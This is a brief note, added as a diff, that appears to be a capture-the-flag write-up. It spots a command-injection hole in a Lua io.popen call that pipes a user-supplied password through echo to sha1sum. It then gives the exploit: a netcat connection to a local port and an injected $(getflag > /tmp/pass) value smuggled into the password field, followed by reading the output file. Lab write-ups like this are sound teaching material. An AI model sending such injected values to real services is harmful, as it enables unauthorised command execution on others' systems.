@@ -1,0 +1,13 @@
+after some search, this line is suspicious :
+
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+it look's like it echo what we pass pipe to sha1 and then open this file 
+
+we can controll "pass" variable"
+
+we can execute anything since we're the one passing `pass`
+
+nc localhost 5151
+$(getflag > /tmp/pass)
+cat /tmp/pass
